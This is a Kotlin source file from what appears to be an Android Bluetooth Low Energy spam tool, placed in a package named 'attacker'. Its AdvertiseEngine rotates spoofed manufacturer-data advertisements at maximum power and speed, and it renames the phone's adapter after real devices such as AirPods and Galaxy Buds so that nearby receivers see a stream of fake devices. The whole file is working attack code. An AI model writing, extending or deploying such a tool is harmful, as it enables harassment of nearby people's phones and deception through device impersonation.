package com.komugi.attacker.ble

import android.Manifest
import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.currentCoroutineContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.Locale

/**
 * Rotates BLE advertisement payloads as fast as the controller accepts them.
 *
 * One advertise slot is used at a time: start, hold for the configured interval, stop,
 * repeat. Rotation order is reshuffled every pass so a receiver sees a scattered stream
 * of models instead of a fixed sequence.
 */
@SuppressLint("MissingPermission")
class AdvertiseEngine(
    private val context: Context,
    private val config: SpamConfig,
    private val payloads: List<BlePayload>,
    private val namePool: List<String>,
) {

    private var job: Job? = null
    private var advertiser: BluetoothLeAdvertiser? = null
    private var adapter: BluetoothAdapter? = null

    private val settings: AdvertiseSettings = AdvertiseSettings.Builder()
        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
        .setConnectable(true)
        .setTimeout(0)
        .build()

    private var lastError = -1

    private val callback = object : AdvertiseCallback() {
        override fun onStartSuccess(settingsInEffect: AdvertiseSettings) {
            lastError = AdvertiseCallback.ADVERTISE_FAILED_ALREADY_STARTED + 100
        }

        override fun onStartFailure(errorCode: Int) {
            lastError = errorCode
        }
    }

    fun start(scope: CoroutineScope) {
        if (job != null) return
        if (!hasPermissions()) {
            SpamState.log("advertise: missing BLUETOOTH_ADVERTISE permission")
            return
        }
        val manager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        adapter = manager?.adapter
        if (adapter == null || !adapter!!.isEnabled) {
            SpamState.log("advertise: bluetooth is off")
            return
        }
        advertiser = adapter!!.bluetoothLeAdvertiser
        if (advertiser == null) {
            SpamState.log("advertise: this controller has no LE advertiser")
            return
        }
        randomizeAdapterName()
        SpamState.log("advertise: engine up, ${payloads.size} payloads, ${config.effectiveInterval} ms")
        job = scope.launch { loop() }
    }

    fun stop() {
        job?.cancel()
        job = null
        runCatching { advertiser?.stopAdvertising(callback) }
        advertiser = null
    }

    private suspend fun loop() {
        var burst = 0
        var consecutiveFailures = 0
        while (currentCoroutineContext().isActive) {
            val payload = payloads.randomOrNull()
            if (payload == null) {
                SpamState.log("advertise: no payload selected")
                return
            }
            val data = buildData(payload)
            if (data == null) {
                SpamState.failure("too large")
                delay(40)
                continue
            }
            val started: Boolean = startBurst(data)

            if (started) {
                burst++
                consecutiveFailures = 0
                SpamState.packet(payload.label)
                if (burst % 40 == 0) {
                    SpamState.log(
                        String.format(Locale.US, "advertise: %d bursts, payload %s", burst, payload.label)
                    )
                }
                delay(config.effectiveInterval)
            } else {
                consecutiveFailures++
                SpamState.failure(payload.label)
                delay(backoffFor(consecutiveFailures))
                if (consecutiveFailures % 25 == 0) {
                    recoverAdvertiser()
                }
            }
        }
    }


    private suspend fun startBurst(data: AdvertiseData): Boolean {
        return try {
            advertiser?.stopAdvertising(callback)
            delay(STOP_SETTLE_MS)
            // The scan response overload returns void: success is "no exception thrown".
            advertiser?.startAdvertising(settings, data, scanResponse(), callback)
            true
        } catch (throwable: Throwable) {
            SpamState.log("advertise: ${throwable.javaClass.simpleName} ${throwable.message.orEmpty()}")
            false
        }
    }

    private fun backoffFor(failures: Int): Long = when {
        failures < 5 -> 40L
        failures < 20 -> 120L
        else -> 400L
    }

    private fun recoverAdvertiser() {
        val manager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        val adapter = manager?.adapter ?: return
        runCatching { advertiser?.stopAdvertising(callback) }
        advertiser = adapter.bluetoothLeAdvertiser
        SpamState.log("advertise: advertiser rebind after repeated failures")
    }

    private fun buildData(payload: BlePayload): AdvertiseData? {
        if (payload.data.size > Payloads.MAX_PAYLOAD_BYTES) return null
        return runCatching {
            AdvertiseData.Builder()
                .setIncludeDeviceName(false)
                .addManufacturerData(payload.companyId, payload.data)
                .build()
        }.getOrNull()
    }

    private fun scanResponse(): AdvertiseData? = runCatching {
        AdvertiseData.Builder()
            .setIncludeDeviceName(true)
            .build()
    }.getOrNull()

    private fun randomizeAdapterName() {
        if (namePool.isEmpty()) return
        runCatching { adapter?.name = namePool.random() }
    }

    private fun hasPermissions(): Boolean {
        val required = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
            listOf(Manifest.permission.BLUETOOTH_ADVERTISE, Manifest.permission.BLUETOOTH_CONNECT)
        } else {
            listOf(Manifest.permission.BLUETOOTH_ADMIN)
        }
        return required.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    companion object {
        private const val STOP_SETTLE_MS = 12L

        val NAME_POOL = listOf(
            "AirPods Pro",
            "AirPods Max",
            "Galaxy Buds2 Pro",
            "Galaxy Watch6",
            "Sony WH-1000XM5",
            "Bose QuietComfort",
            "JBL Flip 6",
            "Tile Mate",
            "Surface Headphones",
            "Beats Studio Pro",
            "Pixel Buds Pro",
            "Nothing Ear (2)",
        )
    }
}
